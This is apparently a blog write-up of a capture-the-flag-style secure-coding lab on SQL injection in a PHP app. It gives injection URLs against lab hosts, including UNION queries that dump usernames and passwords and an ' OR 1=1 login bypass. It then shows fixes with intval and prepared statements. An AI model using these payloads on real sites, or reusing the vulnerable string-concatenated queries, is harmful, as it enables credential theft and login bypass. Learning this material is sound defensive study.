---
layout: single
title: "[Day 16] Secure Coding SQLi’s the king, the carolers sing "
header:
  teaser: "/assets/images/hacking-teaser.JPG"
---

# SQL injection on PHP app

The basic code:
```
$server="db";
$user="logistics_user";
$pwd="somePass123";
$schema="logistics";
   
$db=mysqli_connect($server,$user,$pwd,$schema);
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```


http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=2 would lead to:
```
$query="select * from users where id=2";
$elves_rs=mysqli_query($db,$query);
```


http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 OR id = 4
```
$query="select * from users where id=-1 OR id =4";
$elves_rs=mysqli_query($db,$query);
```


http://LAB_WEB_URL.p.thmlabs.com/webapp/elf.php?id=-1 union all select null,null,username,password,null,null,null from users
or 
http://10-10-231-0.p.thmlabs.com/webapp/elf.php?id=99999 union all select null,null,0x3331333337,null,null,null,null 
or 
http://10-10-231-0.p.thmlabs.com/webapp/search-toys.php?q=99999' union all select null,2,username,password,null,null,null from users -- x.
or 
http://10-10-231-0.p.thmlabs.com/webapp/toy.php?id=1 or 1=1 limit 4,1. If you access the regular link for the Animal Farm


Login with username: ```' OR 1=1-- x```


# Fixing these vulnerabilities

Using simple data type validation
```
$query="select * from users where id=".$_GET['id'];
becomes
$query="select * from users where id=".intval($_GET['id']);
```

Using prepared procedures

```
$query="select * from toys where name like '%".$_GET['q']."%' or description like '%".$_GET['q']."%'";
$toys_rs=mysqli_query($db,$query);

becomes

$q = "%".$_GET['q']."%";
$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
mysqli_stmt_execute($stmt);
$toys_rs=mysqli_stmt_get_result($stmt);
```

and

```
$username=$_POST['username'];
$password=$_POST['password'];
$query="select * from users where username='".$username."' and password='".$password."'";
$users_rs=mysqli_query($db, $query);

becomes

$username=$_POST['username'];
$password=$_POST['password'];

$query="select * from users where username = ? and password = ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$users_rs=mysqli_stmt_get_result($stmt);
```